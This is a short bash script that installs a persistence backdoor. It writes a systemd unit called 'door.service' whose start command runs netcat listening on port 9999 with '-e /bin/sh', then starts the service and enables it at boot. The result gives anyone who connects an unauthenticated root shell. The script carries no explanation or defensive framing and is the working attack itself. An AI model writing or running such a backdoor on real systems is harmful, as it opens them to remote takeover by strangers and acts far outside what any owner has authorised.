#!/bin/bash

echo "[Service]" > /etc/systemd/system/door.service
echo "ExecStart=nc -lvp 9999 -e /bin/sh" >> /etc/systemd/system/door.service
echo "Type=simple" >> /etc/systemd/system/door.service
echo "" >> /etc/systemd/system/door.service
echo "[Install]" >> /etc/systemd/system/door.service
echo "WantedBy=multi-user.target" >> /etc/systemd/system/door.service

systemctl daemon-reload
systemctl start door
systemctl enable door
